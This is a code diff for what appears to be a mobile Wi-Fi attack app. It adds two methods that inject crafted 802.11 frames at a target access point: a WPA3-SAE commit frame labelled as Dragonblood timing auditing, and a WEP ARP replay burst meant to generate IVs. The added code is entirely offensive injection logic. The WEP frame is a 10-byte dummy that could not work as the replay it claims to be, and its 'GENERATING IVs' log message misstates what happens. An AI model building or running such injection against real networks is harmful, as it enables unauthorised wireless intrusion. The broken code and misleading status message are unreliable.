@@ -209,6 +209,44 @@ class TargetViewModel extends ChangeNotifier {
     }
   }
 
+  Future<void> injectWpa3SaeAttack() async {
+    if (!_monitorActive) {
+      _errorMessage = 'MONITOR MODE MUST BE ACTIVE';
+      notifyListeners();
+      return;
+    }
+
+    addLog('STARTING 2026 WPA3-SAE COMMIT AUDIT...');
+    final frame = PacketParser.craftAuth(target.bssid, _myRandomMac);
+    // Overwrite Auth Algo to 3 (SAE)
+    frame[24] = 0x03;
+    frame[25] = 0x00;
+
+    final ok = await NativeBridge.injectFrame(frame);
+    if (ok) {
+      addLog('WPA3-SAE: COMMIT FRAME INJECTED (AUDITING DRAGONBLOOD TIMING...)');
+    } else {
+      addLog('WPA3-SAE: INJECTION FAILED');
+    }
+  }
+
+  Future<void> injectWepArpReplay() async {
+    if (!_monitorActive) {
+      _errorMessage = 'MONITOR MODE MUST BE ACTIVE';
+      notifyListeners();
+      return;
+    }
+
+    addLog('STARTING WEP ARP REPLAY INJECTION...');
+    final dummyArp = Uint8List.fromList([0x08, 0x41, 0x02, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]);
+    final ok = await NativeBridge.injectFrame(dummyArp);
+    if (ok) {
+      addLog('WEP ARP: REPLAY BURST SENT (GENERATING IVs...)');
+    } else {
+      addLog('WEP ARP: INJECTION FAILED');
+    }
+  }
+
   @override
   void dispose() {
     _pcapWriter?.close();
